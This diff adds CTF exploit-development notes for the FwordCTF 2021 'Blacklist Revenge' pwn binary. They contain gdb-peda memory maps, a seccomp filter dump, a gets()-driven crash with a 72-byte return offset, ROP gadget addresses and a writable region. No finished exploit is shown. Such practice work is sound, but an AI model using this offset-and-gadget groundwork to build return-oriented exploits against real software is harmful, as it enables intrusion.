@@ -1,0 +1,94 @@
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r--p	/home/mito/CTF/FwordCTF_2021/Pwn_Blacklist_Revenge/blacklist
+0x00401000         0x004a4000         r-xp	/home/mito/CTF/FwordCTF_2021/Pwn_Blacklist_Revenge/blacklist
+0x004a4000         0x004d8000         r--p	/home/mito/CTF/FwordCTF_2021/Pwn_Blacklist_Revenge/blacklist
+0x004d9000         0x004dd000         r--p	/home/mito/CTF/FwordCTF_2021/Pwn_Blacklist_Revenge/blacklist
+0x004dd000         0x004e0000         rw-p	/home/mito/CTF/FwordCTF_2021/Pwn_Blacklist_Revenge/blacklist
+0x004e0000         0x00504000         rw-p	[heap]
+0x00007ffff7ffa000 0x00007ffff7ffd000 r--p	[vvar]
+0x00007ffff7ffd000 0x00007ffff7fff000 r-xp	[vdso]
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+
+
+mito@ubuntu:~/CTF/FwordCTF_2021/Pwn_Blacklist_Revenge$ seccomp-tools dump ./blacklist 
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
+ 0005: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0012
+ 0006: 0x15 0x05 0x00 0x00000038  if (A == clone) goto 0012
+ 0007: 0x15 0x04 0x00 0x00000039  if (A == fork) goto 0012
+ 0008: 0x15 0x03 0x00 0x0000003a  if (A == vfork) goto 0012
+ 0009: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0012
+ 0010: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x06 0x00 0x00 0x00000000  return KILL
+
+gdb-peda$ c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x400518 --> 0x0 
+RCX: 0x4dd540 --> 0xfbad208b 
+RDX: 0x0 
+RSI: 0x4dd5c3 --> 0x4dfce0000000000a 
+RDI: 0x4dfce0 --> 0x0 
+RBP: 0x4141334141644141 ('AAdAA3AA')
+RSP: 0x7fffffffddd8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+RIP: 0x401e9d (<vuln+35>:	ret)
+R8 : 0x7fffffffdd90 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
+R9 : 0x0 
+R10: 0xffffffff 
+R11: 0x246 
+R12: 0x411900 (<__libc_csu_fini>:	endbr64)
+R13: 0x0 
+R14: 0x4dd018 --> 0x44e4a0 (<__strcpy_avx2>:	endbr64)
+R15: 0x0
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x401e92 <vuln+24>:	call   0x4208b0 <gets>
+   0x401e97 <vuln+29>:	mov    eax,0x0
+   0x401e9c <vuln+34>:	leave  
+=> 0x401e9d <vuln+35>:	ret    
+   0x401e9e <main>:	endbr64 
+   0x401ea2 <main+4>:	push   rbp
+   0x401ea3 <main+5>:	mov    rbp,rsp
+   0x401ea6 <main+8>:	sub    rsp,0x10
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffddd8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0008| 0x7fffffffdde0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0016| 0x7fffffffdde8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0024| 0x7fffffffddf0 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0032| 0x7fffffffddf8 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0040| 0x7fffffffde00 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0048| 0x7fffffffde08 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+0056| 0x7fffffffde10 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000401e9d in vuln ()
+gdb-peda$ patto IAAe
+IAAe found at offset: 72
+
+0x0000000000414e53: pop rax; ret; 
+0x00000000004018ca: pop rdi; ret;
+0x00000000004028b8: pop rsi; ret; 
+0x00000000004017cf: pop rdx; ret; 
+0x0000000000426094: syscall; ret; 
+
+0x4e0990 <_nl_locale_file_list+80>:	0x0000000000000000	0x0000000000000000
+0x4e09a0 <_nl_locale_file_list+96>:	0x0000000000000000	0x0000000000000000
+0x4e09b0 <__printf_modifier_table>:	0x0000000000000000	0x0000000000000000
+0x4e09c0 <string_space>:	0x0000000000000000	0x0000000000000000
+0x4e09d0 <__printf_va_arg_table>:	0x0000000000000000	0x0000000000000000
+0x4e09e0:	0x0000000000000000	0x0000000000000000
+0x4e09f0:	0x0000000000000000	0x0000000000000000
+0x4e0a00:	0x0000000000000000	0x0000000000000000
